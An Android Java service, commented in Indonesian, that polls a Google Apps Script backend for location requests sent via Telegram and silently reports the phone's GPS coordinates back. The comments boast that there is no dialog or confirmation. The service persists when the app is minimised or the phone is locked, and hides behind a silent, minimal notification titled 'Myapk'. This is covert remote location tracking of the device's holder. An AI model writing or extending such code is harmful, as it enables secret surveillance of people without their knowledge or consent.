package com.example.app;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import org.json.JSONObject;

/**
 * Service polling lokasi yang berjalan terus di latar belakang.
 *
 * Tidak ada dialog, tidak ada layar konfirmasi.
 * Begitu ada request lokasi dari Telegram:
 * 1. Kirim RECEIVED ke GAS
 * 2. Ambil GPS satu kali (via LocationHelper)
 * 3. Kirim koordinat ke GAS via LocationSyncWorker
 * 4. GAS kirim link Google Maps ke Telegram
 *
 * Berjalan sebagai Foreground Service sehingga tetap aktif meski:
 * - App di-minimize
 * - HP dikunci
 * - OS mencoba mematikan proses background
 *
 * Catatan AndroidManifest yang wajib ditambahkan:
 *
 *   <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
 *   <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
 *
 *   <service
 *       android:name=".LocationPollingService"
 *       android:exported="false"
 *       android:foregroundServiceType="location"/>
 */
public class LocationPollingService extends Service {

    private static final String TAG            = "LocationPollingService";
    private static final String CHANNEL_ID     = "location_polling";
    private static final int    NOTIFICATION_ID = 4000;

    private static final long POLL_INTERVAL_MS         = 10_000L;
    private static final long POLL_AFTER_LOCATION_MS   = 15_000L;

    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  isPolling     = false;
    private boolean  isCapturing   = false;

    // =========================================================
    // LIFECYCLE SERVICE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        pollHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());

        if (!isPolling) {
            isPolling    = true;
            pollRunnable = this::poll;
            pollHandler.post(pollRunnable);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isPolling = false;
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // POLLING
    // =========================================================

    private void poll() {
        if (!isPolling) return;

        // Kalau sedang ambil GPS, skip poll ini
        if (isCapturing) {
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        new Thread(() -> {

            try {
                JSONObject result =
                        ApiHelper.getPendingLocationRequest();

                if (result == null ||
                        !"success".equalsIgnoreCase(
                                result.optString("status", ""))) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                JSONObject request =
                        result.optJSONObject("request");

                if (request == null) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                String requestId =
                        request.optString("id", "");

                if (requestId.isEmpty()) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                Log.d(TAG, "Location request ditemukan: " + requestId);

                // Simpan requestId ke database lokal HP
                LocationRequestDatabase.saveRequest(
                        getApplicationContext(),
                        requestId,
                        ""
                );

                isCapturing = true;

                // WAJIB jalan di Main thread:
                // LocationHelper pakai LocationManager.requestLocationUpdates()
                // dengan Looper.getMainLooper() — harus dipanggil dari Main thread
                // supaya callback GPS bisa terpicu.
                pollHandler.post(() -> handleLocationRequest(requestId));

            } catch (Exception e) {
                Log.e(TAG, "Error polling", e);
                scheduleNextPoll(POLL_INTERVAL_MS);
            }

        }).start();
    }

    private void scheduleNextPoll(long delayMs) {
        if (!isPolling) return;
        pollHandler.postDelayed(pollRunnable, delayMs);
    }

    // =========================================================
    // HANDLE LOCATION REQUEST (otomatis, tanpa dialog)
    // =========================================================

    private void handleLocationRequest(String requestId) {

        // Cek izin GPS — kalau belum ada, kirim CANCELLED
        boolean hasFine = ContextCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;

        boolean hasCoarse = ContextCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;

        if (!hasFine && !hasCoarse) {
            Log.w(TAG, "Izin lokasi tidak tersedia, membatalkan");

            new Thread(() ->
                    ApiHelper.updateLocationRequestStatus(
                            requestId, "CANCELLED"
                    )
            ).start();

            LocationRequestDatabase.setStatus(
                    getApplicationContext(), "CANCELLED"
            );

            isCapturing = false;
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        // Kirim RECEIVED ke GAS sebelum ambil GPS.
        // Code.gs menolak sendLocationResult jika status bukan RECEIVED.
        new Thread(() ->
                ApiHelper.updateLocationRequestStatus(
                        requestId, "RECEIVED"
                )
        ).start();

        LocationRequestDatabase.setStatus(
                getApplicationContext(), "RECEIVED"
        );

        LocationDebugLogger.log(
                getApplicationContext(),
                "LOCATION_READING",
                "requestId=" + requestId
        );

        // Ambil GPS satu kali — sudah di Main thread, callback langsung terpicu
        LocationHelper.getSingleLocation(
                getApplicationContext(),
                new LocationHelper.Callback() {

                            @Override
                            public void onSuccess(LocationResult locationResult) {

                                LocationDebugLogger.log(
                                        getApplicationContext(),
                                        "LOCATION_ACQUIRED",
                                        locationResult.toPayloadString()
                                );

                                // Kirim via WorkManager supaya tahan
                                // kalau service sempat dimatikan OS
                                OneTimeWorkRequest work =
                                        new OneTimeWorkRequest.Builder(
                                                LocationSyncWorker.class
                                        )
                                        .setInputData(
                                                LocationSyncWorker.buildInput(
                                                        requestId,
                                                        locationResult
                                                )
                                        )
                                        .build();

                                WorkManager.getInstance(
                                        getApplicationContext()
                                ).enqueue(work);

                                LocationRequestDatabase.setStatus(
                                        getApplicationContext(), "QUEUED"
                                );

                                isCapturing = false;
                                scheduleNextPoll(POLL_AFTER_LOCATION_MS);
                            }

                            @Override
                            public void onError(String message) {

                                LocationDebugLogger.log(
                                        getApplicationContext(),
                                        "LOCATION_FAILED",
                                        message
                                );

                                new Thread(() ->
                                        ApiHelper.updateLocationRequestStatus(
                                                requestId, "FAILED"
                                        )
                                ).start();

                                LocationRequestDatabase.setStatus(
                                        getApplicationContext(), "FAILED"
                                );

                                isCapturing = false;
                                scheduleNextPoll(POLL_INTERVAL_MS);
                            }
                        }
                );
    }

    // =========================================================
    // NOTIFIKASI
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Myapk",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);

            NotificationManager nm =
                    getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Myapk")
                        .setContentText("Berjalan di latar belakang")
                        .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    public static void start(Context context) {
        Intent intent = new Intent(context, LocationPollingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(Context context) {
        context.stopService(
                new Intent(context, LocationPollingService.class)
        );
    }
}
